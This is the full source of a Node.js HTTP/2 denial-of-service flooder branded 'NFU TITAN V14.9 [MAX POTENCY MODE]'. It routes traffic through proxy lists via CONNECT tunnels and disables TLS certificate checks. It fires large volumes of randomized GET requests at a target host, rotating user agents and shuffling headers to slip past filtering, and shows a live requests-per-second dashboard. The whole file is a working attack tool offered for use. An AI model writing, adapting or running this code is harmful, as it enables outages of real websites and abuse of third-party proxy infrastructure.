const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const crypto = require("crypto");
const fs = require("fs");
const url = require("url");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

const args = { 
    target: process.argv[2], 
    time: ~~process.argv[3], 
    rate: ~~process.argv[4], 
    threads: ~~process.argv[5],
    proxyFile: process.argv[6] || "proxy.txt"
};

const parsedTarget = url.parse(args.target);
const proxies = fs.readFileSync(args.proxyFile, "utf-8").split(/\r?\n/).filter(l => l.length > 5);
const userAgents = fs.readFileSync("ua.txt", "utf-8").split(/\r?\n/).filter(l => l.length > 10);
const selfReferer = `${parsedTarget.protocol}//${parsedTarget.host}/`;

function format(n) {
    if (n >= 1e9) return (n / 1e9).toFixed(1) + 'B';
    if (n >= 1e6) return (n / 1e6).toFixed(1) + 'M';
    if (n >= 1e3) return (n / 1e3).toFixed(1) + 'K';
    return n;
}

function shuffleHeaders(obj) {
    const keys = Object.keys(obj);
    for (let i = keys.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [keys[i], keys[j]] = [keys[j], keys[i]];
    }
    const shuffled = {};
    keys.forEach(key => shuffled[key] = obj[key]);
    return shuffled;
}

if (cluster.isMaster) {
    console.clear();
    let totalSent = 0, rps = 0;
    const codes = {}, proxyHits = {}, onlineProxies = new Set();

    for (let i = 0; i < args.threads; i++) cluster.fork();

    setInterval(() => {
        console.clear();
        console.log(`\n\x1b[1;37m  \x1b[42m NFU \x1b[0m \x1b[1;32mTITAN V14.9 \x1b[1;30m| \x1b[1;37m[MAX POTENCY MODE]\x1b[0m`);
        console.log(`\x1b[1;30m  ──────────────────────────────────────────────────\x1b[0m`);
        
        process.stdout.write(`\x1b[1;37m  SENT: \x1b[1;32m${format(totalSent).padEnd(8)}\x1b[0m`);
        process.stdout.write(`\x1b[1;37m  RPS: \x1b[1;32m${format(rps).padEnd(8)}\x1b[0m`);
        process.stdout.write(`\x1b[1;37m  TARGET: \x1b[1;36m${parsedTarget.host}\x1b[0m\n`);
        
        let st = Object.entries(codes).sort((a,b) => b[1]-a[1]).slice(0, 4).map(([c,v]) => {
            let color = c == "403" ? "\x1b[1;31m" : (c == "200" ? "\x1b[1;32m" : "\x1b[1;33m");
            return `${color}${c}\x1b[1;37m:${format(v)}`;
        }).join(' \x1b[1;30m| ');
        
        console.log(`\x1b[1;37m  STATUS: ${st || '\x1b[1;30mMoendo...'}\x1b[0m`);
        console.log(`\x1b[1;37m  PROXIES ONLINE: \x1b[1;32m${onlineProxies.size}\x1b[0m`);
        console.log(`\x1b[1;30m  ──────────────────────────────────────────────────\x1b[0m`);
        
        Object.entries(proxyHits).sort((a,b) => b[1]-a[1]).slice(0, 3).forEach(([ip, count]) => {
            console.log(`  \x1b[1;30m> \x1b[1;32m${ip.padEnd(15)}\x1b[1;30m ─ \x1b[1;37mHITS: \x1b[1;32m${format(count)}\x1b[0m`);
        });
        
        rps = 0;
    }, 1000);

    cluster.on('message', (worker, msg) => {
        if (msg.type === 'batch') {
            totalSent += msg.c; rps += msg.c;
            if (msg.ip) {
                onlineProxies.add(msg.ip);
                proxyHits[msg.ip] = (proxyHits[msg.ip] || 0) + msg.c;
            }
            Object.keys(msg.codes).forEach(c => { codes[c] = (codes[c] || 0) + msg.codes[c]; });
        }
    });
    setTimeout(() => process.exit(1), args.time * 1000);
} else {
    // Aumentei o número de conexões paralelas por thread para potência máxima
    for (let i = 0; i < 15; i++) setInterval(runFlooder, 0);
}

function runFlooder() {
    const proxyRaw = proxies[Math.floor(Math.random() * proxies.length)];
    if (!proxyRaw) return;
    const [pHost, pPort] = proxyRaw.split(':');

    const socket = net.connect({ host: pHost, port: parseInt(pPort) });
    socket.setNoDelay(true);
    socket.setKeepAlive(true, 60000);

    socket.once("connect", () => {
        socket.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}:443\r\n\r\n`);
    });

    socket.once("data", (d) => {
        if (!d.toString().includes("200")) return socket.destroy();
        
        const tlsConn = tls.connect({
            socket: socket, servername: parsedTarget.host,
            ALPNProtocols: ["h2"], rejectUnauthorized: false,
            ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256",
        }, () => {
            const client = http2.connect(parsedTarget.href, {
                createConnection: () => tlsConn,
                settings: { 
                    initialWindowSize: 2147483647, // 2GB Max Window Size
                    maxConcurrentStreams: 10000,
                    enablePush: false
                }
            });

            client.on("connect", () => {
                let bCount = 0; let bCodes = {};
                const flood = setInterval(() => {
                    if (!client || client.destroyed) return clearInterval(flood);
                    for (let i = 0; i < args.rate; i++) {
                        const h = {
                            ":method": "GET",
                            ":scheme": "https",
                            ":authority": parsedTarget.host,
                            ":path": parsedTarget.path + "?" + crypto.randomBytes(3).toString('hex'),
                            "user-agent": userAgents[Math.floor(Math.random() * userAgents.length)],
                            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                            "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
                            "referer": selfReferer,
                            "cache-control": "no-cache",
                            "sec-fetch-dest": "document",
                            "sec-fetch-mode": "navigate",
                            "sec-fetch-site": "same-origin",
                            "upgrade-insecure-requests": "1"
                        };

                        const req = client.request(shuffleHeaders(h));
                        req.on("response", (res) => {
                            const sc = res[":status"];
                            bCount++; bCodes[sc] = (bCodes[sc] || 0) + 1;
                            if (bCount >= 100) {
                                process.send({ type: 'batch', c: bCount, codes: bCodes, ip: pHost });
                                bCount = 0; bCodes = {};
                            }
                            req.close(); req.destroy();
                        });
                        req.end();
                    }
                }, 100);
                setTimeout(() => { client.destroy(); socket.destroy(); }, 20000);
            });
            client.on("error", () => socket.destroy());
        });
    });
    socket.on("error", () => socket.destroy());
}
